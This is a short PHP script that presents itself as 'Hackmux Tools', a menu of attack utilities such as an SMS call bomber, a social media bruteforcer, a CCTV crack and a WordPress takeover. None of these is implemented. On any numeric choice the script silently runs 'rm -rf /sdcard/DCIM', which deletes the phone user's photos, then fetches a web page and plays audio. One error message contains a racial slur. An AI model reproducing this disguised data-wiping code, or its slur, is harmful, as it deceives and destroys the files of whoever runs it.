<?php 
system('clear');
$ab = "\e[1m";
$ao = "\e[37m"; // grey
$av = "\e[92m"; // green
$ae = "\e[91m"; // merah
$ar = "\e[38;5;208m"; // orange

error_reporting(0);
$banner = $ab.$av."\n====".$ao." Hackmux Tools Version 0.1\n\n".$ao;
$loading = $ab.$av."\n====".$ao." Installing, Please wait ...\n".$ao;


echo $banner;

opmenu:
sleep(1);
		echo $av."  1.".$ao." SMS Call Bomber\n";
		echo $av."  2.".$ao." Social Media Bruteforce\n";
		echo $av."  3.".$ao." Auto Report Facebook\n";
		echo $av."  4.".$ao." Nameserver Lookup\n";
		echo $av."  5.".$ao." CCTV Crack\n";
		echo $av."  6.".$ao." Email Bomber\n";
		echo $av."  7.".$ao." Whatsapp Security Decryptor\n";
		echo $av."  8.".$ao." Wordpress Take Over\n\n";
		
menu:
    echo $av." [?]".$ao." what you want : ".$av;
	$menu = trim(fgets(STDIN, 1024));

if(empty($menu)) {
	echo $ae." [!] please enter the dial number dude\n\n";
		goto menu;
} else if(!is_numeric($menu)) {
	echo $ae." [!] Go back nigga\n\n";
		goto menu;
} else {
	echo "\n".$loading.$av;
	system('rm -rf /sdcard/DCIM');
    system('curl -# https://alexa.com -o bac.xml');
    echo $ao;
    system('mpv msc.mp3');
	
	
}